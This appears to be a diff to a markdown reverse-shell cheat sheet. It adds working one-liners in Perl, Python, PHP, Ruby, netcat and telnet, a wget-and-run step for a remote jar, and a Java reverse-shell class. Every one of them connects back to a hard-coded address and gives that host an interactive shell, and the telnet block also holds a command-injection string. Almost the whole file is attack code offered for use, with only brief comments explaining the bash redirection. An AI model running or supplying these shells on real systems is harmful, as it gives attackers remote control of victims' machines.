@@ -44,7 +44,7 @@ Open two tabs in your terminal.
 
 ```bash
 
-bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1;
 
 # bash -i "If the -i option is present, the shell is interactive."
 
@@ -55,5 +55,69 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 # 0>&1 redirect file descriptor 0 (stdin) to fd 1 (stdout), hence the opened TCP socket is used to read input.
 
 ```
+
+perl shell
+
+```perl
+perl -e 'use Socket;$i="1.1.1.1";$p=10086;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};';
+```
+
+python shell
+
+```py
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.1.1.1",10086));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);';
+```
+
+php shell
+
+```php
+php -r '$sock=fsockopen("1.1.1.1",10086);exec("/bin/sh -i <&3 >&3 2>&3");';
+```
+
+ruby shell
+
+```ruby
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("1.1.1.1","10086");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end';
+```
+
+nc shell
+
+```bash
+nc -c /bin/sh 1.1.1.1 10086;
+```
+
+telnet shell
+
+```
+telnet 1.1.1.1 10086 | /bin/bash | telnet 1.1.1.1 10087; # Remember to listen on your machine also on port 4445/tcp
+
+127.0.0.1; mknod test p ; telnet 1.1.1.1 10086 0<test | /bin/bash 1>test;
+```
+
+java jar shell
+
+```java
+wget http://1.1.1.1:9999/revs.jar -O /tmp/revs1.jar;
+
+java -jar /tmp/revs1.jar;
+
+import java.io.IOException;    
+public class ReverseShell {    
+    public static void main(String[] args) throws IOException, InterruptedException {
+        // TODO Auto-generated method stub
+        Runtime r = Runtime.getRuntime();
+        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/1.1.1.1/10086;cat <&5 | while read line; do $line 2>&5 >&5; done"};
+        Process p = r.exec(cmd);
+        p.waitFor();
+    }
+}
+```
+
+
+---
+
+ref
+- [example](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/)
+- [2](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 
 .
